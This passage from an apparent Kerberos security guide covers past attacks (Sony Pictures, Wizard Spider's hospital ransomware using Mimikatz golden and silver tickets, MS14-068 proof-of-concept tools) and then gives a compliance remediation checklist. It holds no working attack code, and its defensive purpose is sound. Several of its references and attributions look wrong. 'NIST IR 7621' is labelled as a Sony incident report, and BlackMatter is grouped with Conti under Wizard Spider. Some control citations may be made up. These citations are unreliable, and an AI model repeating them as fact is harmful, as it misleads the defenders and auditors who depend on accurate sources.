- **Technique Usage:** While the primary attack vector was spear-phishing and worm propagation, forensics indicated use of Kerberos-based privilege escalation (consistent with MS14-068 exploitation timeline).
- **Impact:** Complete network compromise, data exfiltration, system destruction, public embarrassment
- **Reference:** [NIST IR 7621: Cyber Security Incident - Sony Pictures](https://www.nist.gov/news-and-events/sony-pictures-hack)

---

### Example 3: Wizard Spider (UNC1878) - Healthcare Ransomware Campaign (2021-2022)

- **Target:** U.S. hospitals and healthcare systems
- **Timeline:** 2021-2022
- **Technique Usage:** Wizard Spider used golden ticket generation (via Mimikatz) to escalate privileges and maintain persistence in hospital networks. They combined this with lateral movement via silver tickets (forged service tickets) to reach backup systems.
- **Impact:** Ransomware encryption (Conti/BlackMatter), significant patient harm, operational disruption
- **Reference:** [FBI / CISA Alert: Conti Ransomware](https://www.cisa.gov/news-events/alerts/2022/05/02/cisa-fbi-odni-release-joint-advisory-conti-ransomware), [Mandiant Threat Intelligence](https://www.mandiant.com/)

---

### Example 4: Microsoft Patch MS14-068 Demonstration (2014)

- **Target:** Security research / proof-of-concept environments
- **Timeline:** November 2014 (patch release)
- **Technique Status:** Exploited by security researchers immediately post-disclosure. Multiple toolsets (PyKEK, Mimikatz) released PoCs within days.
- **Impact:** Demonstrated critical nature of Kerberos infrastructure. Led to rapid patch adoption.
- **Reference:** [Metasploit Module: Kerberos PAC Exploitation](https://www.metasploit.com/), [Sean Metcalf ADSecurity Blog](https://adsecurity.org/?p=676)

---

## 18. COMPLIANCE REMEDIATION CHECKLIST

- [ ] **CIS 5.2.2.3:** Kerberos policy configured with minimum TGT lifetime (8 hours max)
- [ ] **CIS 5.2.3.9:** Event log auditing enabled for Kerberos (4768, 4769, 4672)
- [ ] **DISA STIG:** Credential Guard enabled on Windows 10/11; Kerberos pre-auth enforced
- [ ] **CISA SCuBA:** Multi-factor authentication enforced for admin accounts; Conditional Access policies in place
- [ ] **NIST AC-3:** Access controls restrict Kerberos delegation; privileged account separation enforced
- [ ] **NIST AU-12:** Comprehensive audit logging; centralized log collection and monitoring
- [ ] **GDPR Art. 32:** Encryption enabled (AES-256 for Kerberos tickets); incident response procedures documented
- [ ] **DORA Art. 9:** Security testing includes Kerberos attack simulation; penetration testing scheduled quarterly
- [ ] **NIS2 Art. 21:** Defensive measures include SID filtering, KRBTGT rotation, threat detection
- [ ] **ISO 27001 A.9.2.3:** Privileged access management; segregation of duties for admin accounts
- [ ] **ISO 27005:** Risk assessment identifies Kerberos infrastructure as critical; mitigation controls documented

---
